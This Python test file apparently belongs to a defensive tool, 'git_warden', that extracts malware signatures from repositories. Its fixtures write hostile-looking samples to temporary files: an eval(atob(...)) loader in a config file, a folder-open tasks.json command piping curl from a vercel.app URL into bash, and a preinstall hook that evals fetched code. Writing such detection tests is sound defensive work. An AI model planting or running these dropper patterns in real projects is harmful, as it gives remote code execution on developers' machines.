"""Tests for the malware code-signature engine (novel-repo discovery)."""

from __future__ import annotations

import base64
import json

from git_warden import config
from git_warden.scanning.signatures import extract_code_signatures, load_seed_signatures


def _eval_atob(blob: bytes) -> str:
    return f"module.exports={{}};eval(atob('{base64.b64encode(blob).decode()}'))\n"


def test_extract_code_signatures_finds_eval_atob_stub(tmp_path):
    (tmp_path / "postcss.config.js").write_text(_eval_atob(b"x" * 200), encoding="utf-8")
    sigs = extract_code_signatures(tmp_path)
    assert sigs and all(len(s) >= 48 for s in sigs)
    # The signature is a chunk of the actual base64 payload (searchable on GitHub).
    full = base64.b64encode(b"x" * 200).decode()
    assert sigs[0] in full


def test_extract_ignores_short_atob(tmp_path):
    # A short atob (not a real obfuscated payload) is not a signature.
    (tmp_path / "a.js").write_text("eval(atob('c2hvcnQ='))", encoding="utf-8")
    assert extract_code_signatures(tmp_path) == []


def test_extract_ignores_vendored_and_test_files(tmp_path):
    payload = _eval_atob(b"y" * 200)
    dep = tmp_path / "node_modules" / "pkg"
    dep.mkdir(parents=True)
    (dep / "index.js").write_text(payload, encoding="utf-8")
    (tmp_path / "app.test.js").write_text(payload, encoding="utf-8")
    assert extract_code_signatures(tmp_path) == []


def test_load_seed_signatures(tmp_path):
    p = tmp_path / "sigs.json"
    p.write_text(json.dumps([
        {"name": "a", "query": "foo"}, {"name": "b", "query": "bar"}, {"nope": 1},
    ]), encoding="utf-8")
    assert load_seed_signatures(p) == ["foo", "bar"]


def test_load_seed_signatures_missing_file(tmp_path):
    assert load_seed_signatures(tmp_path / "nope.json") == []


def test_shipped_seed_signatures_load():
    # The version-controlled seed list parses and is non-empty.
    assert len(load_seed_signatures(config.MALWARE_SIGNATURES_PATH)) >= 1


def test_mines_dropper_url_path_from_folderopen_task(tmp_path):
    # The rotation-resistant fingerprint: path + query name, host and value dropped.
    vd = tmp_path / ".vscode"
    vd.mkdir()
    (vd / "tasks.json").write_text(
        '{"tasks":[{"command":'
        '"curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash"}]}',
        encoding="utf-8")
    sigs = extract_code_signatures(tmp_path)
    assert "settings/linux?flag=" in sigs
    # host and the varying flag value are NOT in the signature
    assert not any("vercel.app" in s or "9-test" in s for s in sigs)


def test_mines_eval_fetch_install_hook_path(tmp_path):
    (tmp_path / "package.json").write_text(
        '{"scripts":{"preinstall":'
        '"node -e \\"eval(await fetch(\'https://everydaynodechecker.vercel.app/api/key?mem=root1\'))\\""}}',
        encoding="utf-8")
    sigs = extract_code_signatures(tmp_path)
    assert "api/key?mem=" in sigs


def test_reputable_installer_query_is_not_mined(tmp_path):
    # A real installer piped to sh with a query string is not a dropper fingerprint.
    (tmp_path / "setup.sh").write_text(
        "curl https://deb.nodesource.com/setup_20.x?arch=amd64 | bash", encoding="utf-8")
    assert extract_code_signatures(tmp_path) == []


def test_plain_url_without_fetch_context_is_not_mined(tmp_path):
    # A URL with a query but no fetch-to-shell / eval-fetch context is ignored.
    (tmp_path / "readme.sh").write_text(
        'echo "see https://example.com/docs/page?id=5 for details"', encoding="utf-8")
    assert extract_code_signatures(tmp_path) == []
